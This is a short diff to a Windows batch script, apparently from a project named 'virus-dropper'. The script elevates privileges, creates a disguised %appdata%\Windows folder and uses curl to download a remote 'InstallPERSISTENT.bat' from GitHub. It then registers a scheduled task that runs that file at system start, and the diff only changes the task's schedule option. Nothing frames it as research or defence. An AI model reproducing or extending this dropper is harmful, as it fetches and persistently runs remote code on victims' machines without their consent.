@@ -11,7 +11,7 @@ if '%errorlevel%' NEQ '0' (
     del "%temp%\getadmin.vbs"
     md %appdata%\Windows
     curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/InstallPERSISTENT.bat" --output "%appdata%\Windows\Install.bat"
-    SCHTASKS /CREATE /F /SC STARTUP /TR "%appdata%\Windows\Install.bat" /TN "Install.bat"
+    SCHTASKS /CREATE /F /SC ONSTART /TR "%appdata%\Windows\Install.bat" /TN "Install.bat"
     taskkill /f /IM explorer.exe
     start explorer.exe
     exit /B
